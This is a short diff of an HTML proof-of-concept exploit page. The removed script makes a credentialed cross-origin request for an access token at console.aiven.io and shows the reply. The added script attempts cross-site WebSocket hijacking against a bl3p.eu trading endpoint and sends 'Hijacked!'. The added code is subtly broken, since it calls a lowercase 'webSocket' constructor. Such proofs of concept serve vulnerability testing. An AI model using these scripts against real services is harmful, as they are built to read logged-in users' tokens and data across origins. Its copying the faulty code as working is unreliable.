@@ -1,5 +1,10 @@
-<html>
 <script>
-var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://console.aiven.io/v1/access_token',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
+var webSocket = new webSocket('wss://api.bl3p.eu/1/BTCEUR/trades');
+webSocket.onmessage = function(event) {
+    alert(event.data);
+}
+webSocket.onopen = function(event) {
+    webSocket.send('Hijacked!')
+}
+
 </script>
-</html>
